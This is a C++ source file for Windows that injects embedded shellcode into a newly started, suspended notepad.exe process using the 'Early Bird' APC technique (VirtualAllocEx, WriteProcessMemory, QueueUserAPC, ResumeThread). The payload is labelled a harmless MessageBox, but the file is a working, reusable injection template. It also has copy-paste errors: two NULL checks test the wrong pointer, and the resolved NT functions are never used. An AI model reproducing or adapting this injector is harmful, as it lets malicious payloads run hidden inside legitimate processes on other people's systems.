#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
//#include <winternl.h>
#include "ntbasic.h"

typedef NTSTATUS (NTAPI* pfnNtAllocateVirtualMemory)(

    IN HANDLE               ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG                ZeroBits,
    IN OUT PULONG           RegionSize,
    IN ULONG                AllocationType,
    IN ULONG                Protect
    );

typedef NTSTATUS (NTAPI* pfnNtWriteVirtualMemory)(

    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
    );

typedef NTSTATUS (NTAPI* pfnNtOpenProcess)(

    OUT PHANDLE             ProcessHandle,
    IN ACCESS_MASK          AccessMask,
    IN POBJECT_ATTRIBUTES   ObjectAttributes,
    IN PCLIENT_ID           ClientId
);

// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED
unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

//SIZE_T scSize = sizeof(shellcode);
ULONG scSize = sizeof(shellcode);

int EarlyBird(HANDLE pHandle, HANDLE hThread, unsigned char* shellcode, ULONG scSize, DWORD Pid) {

    // Define NT imports
    // ------------------------------------------------------------------------------------------------------------
    pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAllocateVirtualMemory");
    if (pNtAllocateVirtualMemory == NULL) {
        printf("[-] NtAllocateVirtualMemory [NTDLL] Failed     ->      [ %p ] [ %d ]\n", pNtAllocateVirtualMemory, GetLastError());
        return -2;
    }
    printf("[*] NtAllocateVirtualMemory [NTDLL] Address       ->      [ %p ]\n", pNtAllocateVirtualMemory);

    pfnNtWriteVirtualMemory pNtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtWriteVirtualMemory");
    if (pNtAllocateVirtualMemory == NULL) {
        printf("[-] NtWriteVirtualMemory [NTDLL] Failed     ->      [ %p ] [ %d ]\n", pNtWriteVirtualMemory, GetLastError());
        return -2;
    }
    printf("[*] NtWriteVirtualMemory [NTDLL] Address       ->      [ %p ]\n", pNtWriteVirtualMemory);

    pfnNtOpenProcess pNtOpenProcess = (pfnNtOpenProcess)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtOpenProcess");
    if (pNtAllocateVirtualMemory == NULL) {
        printf("[-] NtOpenProcess [NTDLL] Failed     ->      [ %p ] [ %d ]\n", pNtOpenProcess, GetLastError());
        return -2;
    }
    printf("[*] NtOpenProcess [NTDLL] Address       ->      [ %p ]\n", pNtOpenProcess);


    // ------------------------------------------------------------------------------------------------------------

    LPVOID memAlloc = VirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    printf("[INFO] Memory allocation pointer: %p", (LPVOID)memAlloc);

    SIZE_T bytesWritten = 0;
    WriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &bytesWritten);

    QueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL);

    ResumeThread(hThread);

    return 0;
}

int main() {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    // Clear out startup and process info structures
    RtlSecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlSecureZeroMemory(&pi, sizeof(pi));

    std::wstring pName = L"C:\\Windows\\System32\\notepad.exe";

    HANDLE pHandle = NULL;
    HANDLE hThread = NULL;
    DWORD Pid = 0;

    BOOL cProcess = CreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (cProcess == FALSE) {
        printf("[ERR] Process not created\n");
        return 0;
    }
    printf("[SUCCESS] Process created \n");
    getchar();

    pHandle = pi.hProcess;
    hThread = pi.hThread;

    Pid = pi.dwProcessId;

    printf("Process Handle: %p\n", pHandle);
    printf("Thread Handle: %p\n", hThread);

    EarlyBird(pHandle, hThread, shellcode, scSize, Pid);
    CloseHandle(pHandle);

	return 0;
}
